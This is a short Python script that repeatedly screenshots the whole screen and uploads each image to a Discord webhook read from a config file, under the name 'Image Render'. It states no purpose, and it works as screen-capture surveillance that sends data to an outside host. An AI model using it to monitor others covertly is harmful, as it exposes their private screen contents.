
from discord_webhook import DiscordWebhook
from time import sleep, time
import os
import pyautogui
import json

print("PGM Start")
with open("webhook.json", "r") as f:
	whData = json.loads(f.read())
uri = whData["liv"]

while 1:
	webhook = DiscordWebhook(url=uri, username=f"Image Render [{time()}]",
		avatar_url="https://media.discordapp.net/attachments/881416619937660928/959791245339787274/unknown.png",
		content= f"{int(time())}")

	pic = pyautogui.screenshot()
	pic.save(f'{os.getenv("temp")}/rSHOT.png')

	with open(f'{os.getenv("temp")}/rSHOT.png', "rb") as f:
		# webhook.add_file(file=f.read(), filename=f'{time()}.png')
		webhook.add_file(file=f.read(), filename=f'time.png')

	response = webhook.execute()
	print(response)

	try:
		with open("relax.json", "r") as f:
			relaxData = json.loads(f.read())
		gap = relaxData["time"]
		sleep(gap)
	except FileNotFoundError:
		with open("relax.json", "w") as f:
			f.write(json.dumps({"time": 5}, indent=4))
		sleep(5)